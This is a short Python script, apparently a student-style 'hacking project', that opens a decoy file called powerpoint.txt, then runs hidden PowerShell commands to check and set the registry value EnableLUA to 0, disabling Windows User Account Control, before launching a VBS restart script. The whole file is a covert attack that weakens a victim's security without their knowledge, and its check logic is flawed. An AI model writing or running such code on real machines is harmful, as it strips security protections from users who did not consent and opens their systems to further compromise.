import os
from time import sleep

disable_UAC = "Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0 -Force"
check_if_enable = '(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA'

os.startfile(f"E:/powerpoint.txt")
sleep(10)

if os.system(f"PowerShell.exe -WindowStyle hidden {check_if_enable}") == 0:
    os.system(f"PowerShell.exe -WindowStyle hidden {disable_UAC}")
    os.startfile(f"E:/HackingProject.txt")
    os.system("E:/restartcode.vbs")
else:
    pass
